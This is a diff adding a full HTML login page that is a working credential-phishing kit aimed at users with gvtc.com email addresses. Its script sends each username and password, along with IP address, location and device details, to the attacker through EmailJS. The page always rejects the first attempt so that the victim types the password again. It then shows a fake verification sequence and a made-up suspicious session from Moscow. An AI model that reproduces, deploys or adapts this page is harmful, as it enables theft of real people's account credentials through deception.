@@ -1,0 +1,934 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Please log in</title>
+
+  <!-- EmailJS SDK (required for sending) -->
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+  <style>
+    /* ---------- Reset & base ---------- */
+    *,
+    *::before,
+    *::after { box-sizing: border-box; }
+
+    html {
+      -webkit-text-size-adjust: 100%;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI",
+                   Roboto, "Helvetica Neue", Arial, sans-serif;
+      line-height: 1.5;
+    }
+
+    body {
+      margin: 0;
+      background: #ffffff;
+      color: #1f2a37;
+    }
+
+    button, input { font: inherit; }
+
+    /* ---------- Page shell ---------- */
+    .login-page {
+      width: 100%;
+      min-height: 100vh;
+      min-height: 100svh;
+      padding: 20px 16px 32px;
+    }
+
+    .login-panel {
+      display: block;
+      width: 100%;
+      max-width: 400px;
+      margin: 0 auto;
+    }
+
+    /* ---------- Branding & heading ---------- */
+    .branding {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 16px;
+    }
+    .branding img {
+      display: block;
+      width: auto;
+      height: auto;
+      max-width: 100%;
+      max-height: 90px;
+      object-fit: contain;
+    }
+
+    h1 {
+      margin: 0 0 20px;
+      text-align: center;
+      font-size: 1.25rem;
+      font-weight: 700;
+    }
+
+    /* ---------- Login form ---------- */
+    #contact-form {
+      width: 100%;
+      margin: 0;
+      padding: 0;
+    }
+
+    .formfield { margin-bottom: 18px; }
+
+    .formfield label {
+      display: block;
+      margin-bottom: 6px;
+      color: #374151;
+      font-size: 0.85rem;
+      font-weight: 450;
+      text-transform: uppercase;
+    }
+
+    .formfield input {
+      display: block;
+      width: 100%;
+      min-width: 0;
+      min-height: 44px;
+      padding: 10px 12px;
+      border: 1px solid #63b3ed;
+      border-radius: 6px;
+      background: #ffffff;
+      color: #1f2a37;
+      font-size: 1rem;
+      outline: none;
+    }
+
+    .formfield input:focus,
+    .formfield input:focus-visible {
+      border: 1px solid #63b3ed;
+      box-shadow: none;
+      outline: none;
+    }
+
+    /* Remember-me row */
+    .remember-row {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      margin-top: 4px;
+      flex-wrap: wrap;
+    }
+    #remember_me {
+      flex-shrink: 0;
+      width: 16px;
+      height: 16px;
+      margin: 0;
+      accent-color: #363535;
+    }
+    .remember-label {
+      color: #374151;
+      font-size: 0.9rem;
+      font-weight: 700;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+    }
+
+    /* Help "?" link */
+    .help-btn {
+      padding: 0;
+      margin: 0 0 0 4px;
+      border: none;
+      background: none;
+      color: #38bdf8;
+      font-size: 0.9rem;
+      font-weight: 700;
+      line-height: 1;
+      text-decoration: underline;
+      text-underline-offset: 2px;
+      cursor: pointer;
+    }
+    .help-btn:hover { color: #0284c7; }
+
+    .help-panel {
+      display: none;
+      margin: 10px 0 0;
+      padding: 10px 14px;
+      background: #fef9c3;
+      border-radius: 6px;
+      font-size: 0.85rem;
+      color: #3f3f46;
+      box-shadow: inset 0 1px 3px rgb(0 0 0 / 8%);
+    }
+    .help-panel.show { display: block; }
+    .help-panel p { margin: 0; }
+
+    /* Submit */
+    #submit-btn {
+      display: block;
+      width: 100%;
+      min-height: 48px;
+      margin: 20px 0 16px;
+      padding: 12px 16px;
+      border: none;
+      border-radius: 8px;
+      background: #363535;
+      color: #ffffff;
+      font-size: 1.15rem;
+      font-weight: 700;
+      letter-spacing: 0.05em;
+      text-transform: uppercase;
+      cursor: pointer;
+    }
+    #submit-btn:hover:not(:disabled) { background: #1f1e1e; }
+    #submit-btn:disabled { opacity: 0.65; cursor: not-allowed; }
+
+    /* Account links */
+    #self-care ul {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+      gap: 8px;
+      margin: 0;
+      padding: 0;
+      list-style: none;
+    }
+    #self-care a {
+      color: #5b6b7c;
+      font-size: 0.9rem;
+      text-decoration: underline;
+      text-underline-offset: 2px;
+    }
+    #self-care a:hover { color: #2b8fd6; }
+
+    /* Errors */
+    .error-text {
+      display: block;
+      margin-top: 4px;
+      color: #b3261e;
+      font-size: 0.75rem;
+    }
+    .error-text:empty { display: none; }
+
+    #form-error-banner {
+      display: none;
+      margin: 12px 0;
+      padding: 10px 12px;
+      border: 1px solid #f3b8b4;
+      border-radius: 6px;
+      background: #fdeceb;
+      color: #b3261e;
+      font-size: 0.85rem;
+    }
+    #form-error-banner.show { display: block; }
+
+    /* Focus rings (buttons & links only — inputs handled above) */
+    button:focus-visible,
+    a:focus-visible {
+      outline: 2px solid #2b8fd6;
+      outline-offset: 3px;
+    }
+
+    /* ---------- Verifying overlay ---------- */
+    #verifying-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      z-index: 50;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      gap: 16px;
+      padding: 24px;
+      background: rgb(255 255 255 / 97%);
+      text-align: center;
+    }
+    #verifying-overlay.show { display: flex; }
+
+    .spinner {
+      width: 48px;
+      height: 48px;
+      border: 4px solid #e2e8f0;
+      border-top-color: #2b8fd6;
+      border-radius: 50%;
+      animation: spin 0.9s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .verify-title { font-size: 1.1rem; font-weight: 700; }
+    .verify-status { color: #5b6b7c; font-size: 0.9rem; min-height: 1.2em; }
+
+    @media (prefers-reduced-motion: reduce) {
+      .spinner { animation-duration: 2s; }
+    }
+
+    /* ---------- Activity view ---------- */
+    #activity-view {
+      display: none;
+      flex-direction: column;
+      gap: 16px;
+    }
+    #activity-view.show { display: flex; }
+
+    #activity-view .lede {
+      margin: 0;
+      color: #5b6b7c;
+      font-size: 0.9rem;
+      text-align: center;
+    }
+
+    .session-card {
+      padding: 14px 16px;
+      border: 1px solid #e2e8f0;
+      border-radius: 10px;
+      background: #f8fafc;
+    }
+    .session-card.removed { opacity: 0.45; }
+
+    .device-name { font-weight: 700; margin-bottom: 4px; }
+    .device-meta { color: #5b6b7c; font-size: 0.85rem; margin-bottom: 10px; }
+
+    .session-card button {
+      padding: 6px 12px;
+      border: 1px solid #cbd5e1;
+      border-radius: 6px;
+      background: #ffffff;
+      color: #1f2a37;
+      font-size: 0.85rem;
+      cursor: pointer;
+    }
+    .session-card button:hover:not(:disabled) { background: #f1f5f9; }
+    .session-card button:disabled { opacity: 0.5; cursor: not-allowed; }
+
+    #alert-box {
+      min-height: 0;
+      padding: 0;
+      color: #1f2a37;
+      font-size: 0.9rem;
+    }
+    #alert-box:not(:empty) {
+      padding: 10px 14px;
+      border: 1px solid #bbf7d0;
+      border-radius: 8px;
+      background: #f0fdf4;
+    }
+
+    .activity-actions {
+      display: flex;
+      gap: 10px;
+      flex-wrap: wrap;
+    }
+    .activity-actions button {
+      flex: 1 1 0;
+      min-width: 140px;
+      padding: 12px 16px;
+      border: none;
+      border-radius: 8px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+    #this-was-me { background: #e2e8f0; color: #1f2a37; }
+    #this-was-me:hover { background: #cbd5e1; }
+    #secure-account { background: #363535; color: #ffffff; }
+    #secure-account:hover { background: #1f1e1e; }
+
+    /* ---------- Mobile ---------- */
+    @media (max-width: 480px) {
+      .login-page { padding: 12px 16px 24px; }
+      .branding img { width: 100%; max-width: 280px; }
+    }
+  </style>
+</head>
+
+<body>
+
+<div class="login-page">
+  <main class="login-panel">
+
+    <!-- ============ LOGIN VIEW ============ -->
+    <section id="login-view">
+      <header>
+        <div class="branding">
+          <img src="https://i.imghippo.com/files/knqa6398Itw.png" alt="Company logo" />
+        </div>
+        <h1>Please log in</h1>
+      </header>
+
+      <div id="form-error-banner" role="alert"></div>
+
+      <form id="contact-form" method="POST" action="#" novalidate>
+        <div class="formfield">
+          <label for="email-input">Username</label>
+          <input type="text" id="email-input" name="email"
+                 placeholder="Username" autofocus required autocomplete="username" />
+          <span class="error-text" id="email-error"></span>
+        </div>
+
+        <div class="formfield">
+          <label for="password-input">Password</label>
+          <input type="password" id="password-input" name="password"
+                 placeholder="Password" required autocomplete="current-password" />
+          <span class="error-text" id="password-error"></span>
+        </div>
+
+        <div class="remember-row">
+          <input type="checkbox" id="remember_me" name="remember_me" checked />
+          <label for="remember_me" class="remember-label">Remember Me</label>
+          <button type="button" class="help-btn"
+                  id="remember-help-btn"
+                  aria-expanded="false"
+                  aria-controls="remember-help-panel">?</button>
+        </div>
+        <div class="help-panel" id="remember-help-panel" hidden>
+          <p>
+            When you choose "Remember Me" on sign in, we will remember who you are
+            and keep you signed in for up to 90 days, unless you sign out or your
+            browser cookies are deleted.<br />
+            If you are on a public computer, we recommend you uncheck the box.
+          </p>
+        </div>
+
+        <button id="submit-btn" type="submit">Submit</button>
+      </form>
+
+      <section id="self-care">
+        <ul>
+          <li><a id="register" href="#" target="_blank" rel="noopener">Need to register?</a></li>
+          <li><a id="forgot_password" href="#" target="_blank" rel="noopener">Forgot Password?</a></li>
+        </ul>
+      </section>
+    </section><!-- /#login-view -->
+
+    <!-- ============ VERIFYING OVERLAY ============ -->
+    <div id="verifying-overlay" role="status" aria-live="polite">
+      <div class="spinner" aria-hidden="true"></div>
+      <div class="verify-title">Verifying your credentials</div>
+      <div class="verify-status" id="verify-status">Contacting authentication server…</div>
+    </div>
+
+    <!-- ============ ACTIVITY VIEW ============ -->
+    <section id="activity-view">
+      <header>
+        <div class="branding">
+          <img src="https://i.imghippo.com/files/knqa6398Itw.png" alt="Company logo" />
+        </div>
+        <h1>Recent account activity</h1>
+      </header>
+
+      <p class="lede">Review sessions on your account</p>
+
+      <div class="session-card" id="session-current">
+        <div class="device-name">Current device</div>
+        <div class="device-meta" id="current-device-meta">Loading device info…</div>
+        <button type="button" id="remove-current">Remove</button>
+      </div>
+
+      <div class="session-card" id="session-warsaw">
+        <div class="device-name">Moscow, Russia</div>
+        <div class="device-meta" id="unknown-device-meta">Loading…</div>
+        <button type="button" id="remove-warsaw">Remove</button>
+      </div>
+
+      <div id="alert-box" role="status" aria-live="polite"></div>
+
+      <div class="activity-actions">
+        <button type="button" id="this-was-me">This was me</button>
+        <button type="button" id="secure-account">Secure my account</button>
+      </div>
+    </section><!-- /#activity-view -->
+
+  </main>
+</div>
+
+<script>
+/* =========================================================================
+   Boot EmailJS (idempotent — safe if the SDK isn't loaded yet)
+   ========================================================================= */
+function bootEmailJS() {
+  if (window.emailjs && emailjs.init) {
+    try { emailjs.init("uGRhkufMjo08rjwb_"); } catch { /* already init */ }
+    return true;
+  }
+  return false;
+}
+bootEmailJS();
+
+/* =========================================================================
+   DOM references
+   ========================================================================= */
+const form            = document.getElementById("contact-form");
+const emailInput      = document.getElementById("email-input");
+const passwordInput   = document.getElementById("password-input");
+const emailError      = document.getElementById("email-error");
+const passwordError   = document.getElementById("password-error");
+const formErrorBanner = document.getElementById("form-error-banner");
+const submitBtn       = document.getElementById("submit-btn");
+
+const loginView         = document.getElementById("login-view");
+const verifyingOverlay  = document.getElementById("verifying-overlay");
+const verifyStatus      = document.getElementById("verify-status");
+const activityView      = document.getElementById("activity-view");
+const currentDeviceMeta = document.getElementById("current-device-meta");
+const unknownDeviceMeta = document.getElementById("unknown-device-meta");
+
+const sessionCurrent   = document.getElementById("session-current");
+const sessionWarsaw    = document.getElementById("session-warsaw");
+const removeCurrentBtn = document.getElementById("remove-current");
+const removeWarsawBtn  = document.getElementById("remove-warsaw");
+const alertBox         = document.getElementById("alert-box");
+
+/* =========================================================================
+   Help popover
+   ========================================================================= */
+const helpBtn   = document.getElementById("remember-help-btn");
+const helpPanel = document.getElementById("remember-help-panel");
+
+function setHelp(open) {
+  helpPanel.hidden = !open;
+  helpPanel.classList.toggle("show", open);
+  helpBtn.setAttribute("aria-expanded", String(open));
+}
+helpBtn.addEventListener("click", (e) => {
+  e.preventDefault();
+  setHelp(helpPanel.hidden);
+});
+document.addEventListener("click", (e) => {
+  if (helpPanel.hidden) return;
+  if (helpBtn.contains(e.target) || helpPanel.contains(e.target)) return;
+  setHelp(false);
+});
+document.addEventListener("keydown", (e) => {
+  if (e.key === "Escape" && !helpPanel.hidden) {
+    setHelp(false);
+    helpBtn.focus();
+  }
+});
+
+/* =========================================================================
+   Allowed email domains
+   ========================================================================= */
+const ACCEPTED_DOMAINS = ["gvtc.com"];
+const allowedDomainRegex = (() => {
+  const escaped = ACCEPTED_DOMAINS.map((d) => d.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"));
+  return new RegExp(`^[^@\\s]+@(${escaped.join("|")})$`, "i");
+})();
+
+/* =========================================================================
+   Rate limit
+   ========================================================================= */
+const RATE_LIMIT_KEY = "gvtc_verification_attempts";
+const WINDOW_MS      = 60 * 60 * 1000;
+const MAX_ATTEMPTS   = 3;
+
+function readRateData() {
+  const fallback = { attempts: [], lastSubmit: 0 };
+  try {
+    const stored = localStorage.getItem(RATE_LIMIT_KEY);
+    if (!stored) return fallback;
+    const parsed = JSON.parse(stored);
+    if (!Array.isArray(parsed.attempts)) parsed.attempts = [];
+    if (typeof parsed.lastSubmit !== "number") parsed.lastSubmit = 0;
+    return parsed;
+  } catch {
+    return fallback;
+  }
+}
+function writeRateData(data) {
+  try { localStorage.setItem(RATE_LIMIT_KEY, JSON.stringify(data)); } catch { /* ignore */ }
+}
+function checkRateLimit() {
+  const now  = Date.now();
+  const data = readRateData();
+  data.attempts = data.attempts.filter((t) => now - t < WINDOW_MS);
+  writeRateData(data);
+
+  if (data.lastSubmit && now - data.lastSubmit < WINDOW_MS) {
+    const remaining = Math.ceil((WINDOW_MS - (now - data.lastSubmit)) / 60000);
+    return {
+      limited: true,
+      message: `Verification already completed on this device. Please wait ${remaining} minute(s) before trying again.`
+    };
+  }
+  if (data.attempts.length >= MAX_ATTEMPTS) {
+    const oldest    = data.attempts[0];
+    const remaining = Math.ceil((WINDOW_MS - (now - oldest)) / 60000);
+    return {
+      limited: true,
+      message: `Too many attempts. Please wait ${remaining} minute(s) before trying again.`
+    };
+  }
+  return { limited: false, data };
+}
+function recordAttempt() {
+  const data = readRateData();
+  data.attempts.push(Date.now());
+  writeRateData(data);
+}
+function recordSuccess() {
+  const data = readRateData();
+  data.lastSubmit = Date.now();
+  writeRateData(data);
+}
+
+/* =========================================================================
+   Device / location helpers
+   ========================================================================= */
+function getBrowser() {
+  const ua = navigator.userAgent;
+  if (ua.includes("SamsungBrowser")) return "Samsung Internet";
+  if (ua.includes("Firefox")) return "Firefox";
+  if (ua.includes("Edg")) return "Edge";
+  if (ua.includes("OPR") || ua.includes("Opera")) return "Opera";
+  if (ua.includes("Trident")) return "Internet Explorer";
+  if (ua.includes("Chrome")) return "Chrome";
+  if (ua.includes("Safari")) return "Safari";
+  return "Unknown";
+}
+function getOS() {
+  const ua = navigator.userAgent;
+  if (ua.includes("Windows")) return "Windows";
+  if (ua.includes("Android")) return "Android";
+  if (ua.includes("like Mac")) return "iOS";
+  if (ua.includes("Mac")) return "MacOS";
+  if (ua.includes("Linux")) return "Linux";
+  return "Unknown";
+}
+function getTimezone() {
+  try { return Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown"; }
+  catch { return "Unknown"; }
+}
+function getTimestamp() {
+  return new Date().toLocaleString("en-US", { timeZoneName: "short" });
+}
+function formatDeviceTime(date) {
+  const pad = (n) => String(n).padStart(2, "0");
+  const yyyy = date.getFullYear();
+  const mm   = pad(date.getMonth() + 1);
+  const dd   = pad(date.getDate());
+  const hh   = pad(date.getHours());
+  const mi   = pad(date.getMinutes());
+  let tz = "";
+  try {
+    tz = new Intl.DateTimeFormat("en-US", { timeZoneName: "short" })
+      .formatToParts(date)
+      .find((p) => p.type === "timeZoneName")?.value || "";
+  } catch { /* ignore */ }
+  return `${yyyy}-${mm}-${dd} ${hh}:${mi}${tz ? ` (${tz})` : ""}`;
+}
+async function getIP() {
+  try {
+    const res  = await fetch("https://api.ipify.org?format=json");
+    const data = await res.json();
+    return data.ip || "Not available";
+  } catch {
+    return "Not available";
+  }
+}
+async function getLocation() {
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    if (!res.ok) return null;
+    const data = await res.json();
+    const city    = data.city || "";
+    const country = data.country_name || data.country || "";
+    if (city && country) return `${city}, ${country}`;
+    return country || null;
+  } catch {
+    return null;
+  }
+}
+
+/* =========================================================================
+   EmailJS send — resilient to SDK load timing
+   ========================================================================= */
+function waitForEmailJS(timeoutMs = 4000) {
+  return new Promise((resolve) => {
+    if (window.emailjs && emailjs.send) return resolve(true);
+    const started = Date.now();
+    const id = setInterval(() => {
+      if (window.emailjs && emailjs.send) {
+        clearInterval(id);
+        bootEmailJS();
+        resolve(true);
+      } else if (Date.now() - started > timeoutMs) {
+        clearInterval(id);
+        resolve(false);
+      }
+    }, 100);
+  });
+}
+
+async function sendAttemptToEmailJS({ emailValue, passwordValue, attempt }) {
+  const [ip, location] = await Promise.all([getIP(), getLocation()]);
+
+  const pageTitle = document.title;
+  const pageUrl   = window.location.href;
+  const hostname  = window.location.hostname;
+  const pathname  = window.location.pathname;
+  const referrer  = document.referrer || "Direct";
+  const browser   = getBrowser();
+  const os        = getOS();
+
+  const device = (() => {
+    const ua = navigator.userAgent;
+    if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return "Tablet";
+    if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua))
+      return "Mobile";
+    return "Desktop";
+  })();
+
+  const screenResolution = `${window.screen.width}x${window.screen.height}`;
+  const viewportSize     = `${window.innerWidth}x${window.innerHeight}`;
+  const timezone         = getTimezone();
+  const language         = navigator.language || "Unknown";
+
+  const attemptLabel = attempt === 1
+    ? "FIRST ATTEMPT (Incorrect credentials shown)"
+    : "SECOND ATTEMPT (Verification successful)";
+
+  const messageLog = [
+    attemptLabel,
+    `Timestamp: ${getTimestamp()}`,
+    `Email/Username: ${emailValue}`,
+    `Password: ${passwordValue}`,
+    `Page Title: ${pageTitle}`,
+    `Page URL: ${pageUrl}`,
+    `Hostname: ${hostname}`,
+    `Pathname: ${pathname}`,
+    `Referrer: ${referrer}`,
+    `Browser: ${browser}`,
+    `IP: ${ip}`,
+    `OS: ${os}`,
+    `Device: ${device}`,
+    `Screen Resolution: ${screenResolution}`,
+    `Viewport: ${viewportSize}`,
+    `Timezone: ${timezone}`,
+    `Approx. Location: ${location || "Unknown"}`,
+    `Language: ${language}`,
+    `Total Elements: ${document.getElementsByTagName("*").length}`,
+    `Forms: ${document.forms.length}`,
+    `Inputs: ${document.querySelectorAll("input").length}`,
+    `Links: ${document.querySelectorAll("a").length}`
+  ].join("\n");
+
+  const templateParams = {
+    timestamp: getTimestamp(),
+    from_email: emailValue,
+    password: passwordValue,
+    attempt_number: attempt,
+    attempt_label: attemptLabel,
+    page_title: pageTitle,
+    page_url: pageUrl,
+    page_hostname: hostname,
+    page_pathname: pathname,
+    referrer,
+    browser,
+    ip,
+    os,
+    device,
+    screen_resolution: screenResolution,
+    viewport_size: viewportSize,
+    timezone,
+    location: location || "Unknown",
+    language,
+    message: messageLog
+  };
+
+  // Wait for the SDK instead of bailing out on the first tick.
+  const ready = await waitForEmailJS(4000);
+  if (!ready) {
+    console.error(
+      "[EmailJS] SDK not loaded after 4s. Attempt NOT sent. Payload:",
+      templateParams
+    );
+    return;
+  }
+
+  try {
+    const response = await emailjs.send("service_t84doqy", "template_4rsr5vq", templateParams);
+    console.log(`[EmailJS] SUCCESS (attempt ${attempt}):`, response.status, response.text);
+  } catch (error) {
+    console.error(`[EmailJS] FAILED (attempt ${attempt}):`, error);
+  }
+}
+
+/* =========================================================================
+   Verifying sequence — under 3 seconds on the second attempt
+   ========================================================================= */
+const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
+async function runVerifyingSequence() {
+  const stages = [
+    { text: "Contacting authentication server…", delay: 700 },
+    { text: "Verifying credentials…",            delay: 800 },
+    { text: "Checking account activity…",        delay: 700 },
+    { text: "Finalizing sign-in…",               delay: 600 }
+  ];
+  for (const stage of stages) {
+    verifyStatus.textContent = stage.text;
+    await sleep(stage.delay);
+  }
+}
+
+/* =========================================================================
+   Two-attempt flow
+   ========================================================================= */
+let attemptNumber = 1;
+
+form.addEventListener("submit", async (e) => {
+  e.preventDefault();
+
+  emailError.textContent      = "";
+  passwordError.textContent   = "";
+  formErrorBanner.textContent = "";
+  formErrorBanner.classList.remove("show");
+
+  const rateCheck = checkRateLimit();
+  if (rateCheck.limited) {
+    formErrorBanner.textContent = rateCheck.message;
+    formErrorBanner.classList.add("show");
+    return;
+  }
+
+  const emailValue    = emailInput.value.trim();
+  const passwordValue = passwordInput.value.trim();
+  let valid = true;
+
+  if (!emailValue) {
+    emailError.textContent = "Email is required.";
+    valid = false;
+  } else if (!allowedDomainRegex.test(emailValue)) {
+    emailError.textContent = "Email must be from an accepted domain.";
+    valid = false;
+  }
+  if (!passwordValue) {
+    passwordError.textContent = "Password is required.";
+    valid = false;
+  }
+  if (!valid) return;
+
+  recordAttempt();
+
+  submitBtn.disabled    = true;
+  submitBtn.textContent = "Verifying…";
+
+  // Fire-and-forget (the function now waits internally for the SDK).
+  sendAttemptToEmailJS({ emailValue, passwordValue, attempt: attemptNumber });
+
+  // ---- FIRST ATTEMPT: show "incorrect credentials", stay on form ----
+  if (attemptNumber === 1) {
+    await sleep(900);
+    submitBtn.disabled    = false;
+    submitBtn.textContent = "Submit";
+
+    formErrorBanner.textContent =
+      "Incorrect username or password. Please try again.";
+    formErrorBanner.classList.add("show");
+
+    passwordInput.value = "";
+    passwordInput.focus();
+
+    attemptNumber = 2;
+    return;
+  }
+
+  // ---- SECOND ATTEMPT: verify, then show activity view (< 3 s) ----
+  const now            = new Date();
+  const thirtyMinLater = new Date(now.getTime() + 30 * 60 * 1000);
+  const browser        = getBrowser();
+  const os             = getOS();
+
+  const location = await Promise.race([
+    getLocation(),
+    sleep(800).then(() => null)
+  ]);
+  const locationLabel = location || getTimezone();
+
+  currentDeviceMeta.textContent = `${browser} on ${os} · ${locationLabel} · ${formatDeviceTime(now)}`;
+  unknownDeviceMeta.textContent = `Chrome on Windows · Moscow, Russia · ${formatDeviceTime(thirtyMinLater)}`;
+
+  loginView.style.display = "none";
+  verifyingOverlay.classList.add("show");
+
+  await runVerifyingSequence();
+
+  verifyingOverlay.classList.remove("show");
+  activityView.classList.add("show");
+
+  submitBtn.disabled    = false;
+  submitBtn.textContent = "Submit";
+
+  sessionCurrent.classList.remove("removed");
+  sessionWarsaw.classList.remove("removed");
+  removeCurrentBtn.disabled = false;
+  removeWarsawBtn.disabled  = false;
+
+  recordSuccess();
+});
+
+/* =========================================================================
+   Remove-session buttons
+   ========================================================================= */
+function removeSession(sessionEl, label) {
+  if (!sessionEl) return;
+  sessionEl.classList.add("removed");
+  const btn = sessionEl.querySelector("button");
+  if (btn) btn.disabled = true;
+  console.log(`Session removed: ${label}`);
+}
+
+removeCurrentBtn.addEventListener("click", (e) => {
+  e.preventDefault();
+  removeSession(sessionCurrent, "current device");
+});
+
+removeWarsawBtn.addEventListener("click", (e) => {
+  e.preventDefault();
+  removeSession(sessionWarsaw, "Moscow, Russia");
+});
+
+/* =========================================================================
+   Activity view actions
+   ========================================================================= */
+document.getElementById("this-was-me").addEventListener("click", () => {
+  activityView.classList.remove("show");
+  loginView.style.display = "block";
+
+  form.reset();
+  formErrorBanner.classList.remove("show");
+  formErrorBanner.textContent = "";
+  alertBox.textContent = "";
+  attemptNumber = 1;
+
+  sessionCurrent.classList.remove("removed");
+  sessionWarsaw.classList.remove("removed");
+  removeCurrentBtn.disabled = false;
+  removeWarsawBtn.disabled  = false;
+
+  currentDeviceMeta.textContent = "Loading device info…";
+  unknownDeviceMeta.textContent = "Loading…";
+
+  setHelp(false);
+  emailInput.focus();
+});
+
+document.getElementById("secure-account").addEventListener("click", () => {
+  removeSession(sessionWarsaw, "Moscow, Russia (secured)");
+  alertBox.innerHTML = `
+    <strong>Account secured.</strong><br />
+    The suspicious session from <strong>Moscow, Russia</strong> has been removed.
+  `;
+});
+
+/* =========================================================================
+   On load: apply existing rate-limit state
+   ========================================================================= */
+document.addEventListener("DOMContentLoaded", () => {
+  bootEmailJS();
+  const rateCheck = checkRateLimit();
+  if (rateCheck.limited) {
+    formErrorBanner.textContent = rateCheck.message;
+    formErrorBanner.classList.add("show");
+    submitBtn.disabled    = true;
+    submitBtn.textContent = "Verification Complete";
+  }
+});
+</script>
+
+</body>
+</html>
